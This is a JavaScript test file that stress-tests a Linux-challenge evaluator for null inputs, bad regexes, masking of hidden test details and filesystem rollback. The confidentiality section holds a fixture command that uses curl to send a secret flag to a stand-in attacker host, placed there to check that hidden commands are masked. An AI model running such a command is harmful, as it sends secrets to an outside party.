/**
 * Adversarial Stress Tests for LinuxChallengeEvaluator
 * Evaluates edge cases, boundary conditions, injection resistance, and confidentiality leaks.
 */

import { LinuxChallengeEvaluator } from '../../../frontend/js/linux/linux-evaluator.js';
import { VirtualFS } from '../../../frontend/js/linux/vfs.js';

let passed = 0;
let failed = 0;

function check(cond, msg) {
  if (cond) {
    passed++;
    console.log(`  ✓ ${msg}`);
  } else {
    failed++;
    console.error(`  ✗ FAIL: ${msg}`);
  }
}

async function run() {
  console.log('--- 1. Empty & Null Inputs ---');
  {
    const challenge = {
      id: 'ADV-01',
      public_tests: [{ name: 'test_empty', assertion_type: 'stdout', expected: '' }]
    };

    const res1 = await LinuxChallengeEvaluator.evaluate('', challenge);
    check(res1.success === true, 'Empty string command handled safely');

    const res2 = await LinuxChallengeEvaluator.evaluate(null, challenge);
    check(res2.success === true, 'Null command handled safely');

    const res3 = await LinuxChallengeEvaluator.evaluate(undefined, challenge);
    check(res3.success === true, 'Undefined command handled safely');
  }

  console.log('--- 2. Invalid Regex In Assertions ---');
  {
    const challenge = {
      id: 'ADV-02',
      initial_fs: { files: [{ path: '/home/student/foo.txt', content: 'bar' }] },
      public_tests: [
        {
          name: 'invalid_regex_test',
          assertion_type: 'fs_content_regex',
          path: '/home/student/foo.txt',
          expected: '[unclosed(bracket'
        }
      ]
    };

    try {
      // RegExp constructor may throw; evaluator handles or throws
      let caught = false;
      try {
        const res = await LinuxChallengeEvaluator.evaluate('echo ok', challenge);
        check(res.public_results[0].passed === false, 'Invalid regex gracefully failed');
      } catch (err) {
        caught = true;
        check(true, 'Invalid regex threw error before execution');
      }
    } catch (e) {
      check(false, `Unexpected failure: ${e.message}`);
    }
  }

  console.log('--- 3. Strict Confidentiality Leak Verification ---');
  {
    const secretCmd = 'curl https://attacker.com/leak?flag=SUPER_SECRET_KEY';
    const secretContent = 'SUPER_SECRET_FILE_CONTENT_XYZ';
    const secretPattern = 'SECRET_REGEX_[0-9]+';

    const challenge = {
      id: 'ADV-CONF',
      initial_fs: {
        files: [{ path: '/home/student/secrets.dat', content: secretContent }]
      },
      public_tests: [
        { name: 'Public Test', cmd: 'echo public', expected: 'public' }
      ],
      hidden_tests: [
        {
          name: 'Hidden Check 1',
          cmd: secretCmd,
          assertion_type: 'stdout_contains',
          expected: 'flag=SUPER_SECRET_KEY'
        },
        {
          name: 'Hidden Check 2',
          assertion_type: 'fs_content_regex',
          path: '/home/student/secrets.dat',
          expected: secretPattern
        },
        {
          name: 'Hidden Check 3',
          assertion_type: 'fs_content_exact',
          path: '/home/student/secrets.dat',
          expected: secretContent
        }
      ]
    };

    const res = await LinuxChallengeEvaluator.evaluate('cat /home/student/secrets.dat', challenge);

    const jsonStr = JSON.stringify(res.hidden_results);
    check(!jsonStr.includes('SUPER_SECRET_KEY'), 'No secret key in hidden_results JSON');
    check(!jsonStr.includes(secretCmd), 'No secret cmd in hidden_results JSON');
    check(!jsonStr.includes(secretContent), 'No secret content in hidden_results JSON');
    check(!jsonStr.includes(secretPattern), 'No secret pattern in hidden_results JSON');

    for (const h of res.hidden_results) {
      check(h.cmd === '[Protégé]', 'Hidden cmd is masked');
      check(h.expected === '[Protégé]', 'Hidden expected is masked');
      check(h.assertion_type === '[Protégé]', 'Hidden assertion_type is masked');
    }
  }

  console.log('--- 4. VFS State Rollback Isolation ---');
  {
    const challenge = {
      id: 'ADV-ISOL',
      initial_fs: {
        files: [{ path: '/home/student/data.txt', content: 'INITIAL_STUDENT_DATA' }]
      },
      public_tests: [
        {
          name: 'Assert 1 mutates VFS',
          cmd: 'echo "MUTATION_1" > /home/student/data.txt',
          assertion_type: 'exit_code',
          expected: 0
        },
        {
          name: 'Assert 2 mutates VFS',
          cmd: 'rm /home/student/data.txt',
          assertion_type: 'exit_code',
          expected: 0
        },
        {
          name: 'Assert 3 verifies clean baseline',
          assertion_type: 'fs_content_exact',
          path: '/home/student/data.txt',
          expected: 'INITIAL_STUDENT_DATA'
        }
      ]
    };

    const res = await LinuxChallengeEvaluator.evaluate('echo "No change"', challenge);
    check(res.success === true, 'All 3 tests passed');
    check(res.public_results[2].passed === true, 'Final assertion observed initial data despite prior rm / echo');
  }

  console.log(`\nADVERSARIAL STRESS TEST SUMMARY: ${passed} passed, ${failed} failed`);
  if (failed > 0) process.exit(1);
}

run().catch(err => {
  console.error('Fatal test error:', err);
  process.exit(1);
});
